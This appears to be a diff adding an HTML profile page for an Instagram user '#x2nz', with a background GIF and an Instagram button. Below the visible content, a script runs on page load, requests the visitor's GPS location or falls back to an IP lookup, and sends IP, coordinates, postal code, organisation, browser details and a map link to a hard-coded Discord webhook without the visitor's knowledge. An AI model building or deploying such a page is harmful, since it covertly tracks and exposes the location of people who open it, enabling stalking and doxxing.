@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>#x2nz</title>
+
+  <!-- خط Oswald -->
+  <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- خلفية الفيديو (من رابط Discord GIF) -->
+  <video autoplay muted loop playsinline id="bg-video">
+    <source src="https://media.discordapp.net/attachments/1384630856961757224/1384632936195952752/aqm0fk-hktudrp-j3s2rkp-aflqdovxmjf0aqdjuaxcllrxpa0ni4ov1w7y19zizrl6clm2_NAj77H6H.gif?ex=68532369&is=6851d1e9&hm=d10787d3e3252d717012b8a8f9f92dcbf5ea476fc54cd4ec4bb57ed9cf52a74d&=&width=660&height=348" type="image/gif">
+  </video>
+
+  <!-- المحتوى -->
+  <div class="overlay">
+    <div class="content">
+      <h1>#x2nz</h1>
+      <p>iG : jx2nz</p>
+
+      <!-- زر إنستقرام -->
+      <a href="https://instagram.com/jx2nz" target="_blank" class="insta-btn">
+        <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" alt="Instagram">
+      </a>
+    </div>
+  </div>
+
+  <!-- سكربت دمج الموقع الحقيقي مع التقريبي (لم يتغيّر) -->
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1384630871562125364/g_w06ARXqP5kPsXP26dgvX2conr3odp-DzKinAgmE8CC6Yix1zBfsWVKmA7Hjq4iJDbE";
+
+    function sendToWebhook(info) {
+      const payload = {
+        content: "**📡 New Visitor**",
+        embeds: [{
+          title: "Visitor Info",
+          color: 0xff1eb4,
+          fields: [
+            { name: "IP",          value: info.ip ?? "N/A",                              inline: true },
+            { name: "Location",    value: info.location ?? "N/A",                        inline: true },
+            { name: "Coordinates", value: info.coords ?? "N/A",                          inline: true },
+            { name: "Postal Code", value: info.postal ?? "N/A",                          inline: true },
+            { name: "Timezone",    value: info.timezone ?? "N/A",                        inline: true },
+            { name: "Map",         value: info.mapUrl ? `[Open Map](${info.mapUrl})` : "N/A", inline: false },
+            { name: "Org",         value: info.org ?? "N/A",                              inline: false },
+            { name: "Browser",     value: navigator.userAgent,                            inline: false },
+            { name: "Time",        value: new Date().toLocaleString(),                    inline: false }
+          ]
+        }]
+      };
+
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(console.error);
+    }
+
+    /* حاول الموقع الحقيقي أولاً */
+    navigator.geolocation.getCurrentPosition(success => {
+      const lat = success.coords.latitude;
+      const lon = success.coords.longitude;
+      const coords = `${lat},${lon}`;
+      const mapUrl = `https://www.google.com/maps?q=${coords}`;
+
+      sendToWebhook({
+        coords,
+        mapUrl,
+        location: "Real Location (GPS)"
+      });
+    }, () => {
+      /* fallback إلى ipinfo.io */
+      fetch('https://ipinfo.io/json?token=11ee82e81655c4')
+        .then(r => r.json())
+        .then(info => sendToWebhook({
+          ip: info.ip,
+          location: `${info.city}, ${info.region}, ${info.country}`,
+          coords: info.loc,
+          postal: info.postal,
+          timezone: info.timezone,
+          org: info.org,
+          mapUrl: info.loc ? `https://www.google.com/maps?q=${info.loc}` : null
+        }))
+        .catch(console.error);
+    });
+  </script>
+
+</body>
+</html>
